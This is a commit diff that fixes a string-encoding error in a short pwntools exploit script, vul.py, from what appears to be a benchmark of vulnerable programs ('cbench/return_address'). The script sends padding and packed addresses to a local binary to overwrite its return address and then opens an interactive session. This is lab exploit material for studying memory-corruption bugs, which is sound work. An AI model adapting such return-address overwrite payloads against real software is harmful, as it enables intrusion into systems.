8bdf90c1122c6e7fe1a00657b3439add03822da7
helloworld <zhuyan2015@foxmail.com>
2023-09-12 21:36:51 +0800

    Update vul.py
    fix running failure

--- cbench/return_address/vul.py
+++ cbench/return_address/vul.py
@@ -1,7 +1,7 @@
 from pwn import *
 context.log_level = "debug"
 r = process('./ret_injection')
-vul_addr='a'*4+p64(0x41)+p64(0x2012c0)
+vul_addr='a'*4+p64(0x41).decode("iso-8859-1")+p64(0x2012c0).decode("iso-8859-1")
 r.recvuntil("plz input your name: \n")
 r.sendline(vul_addr)
 r.interactive()
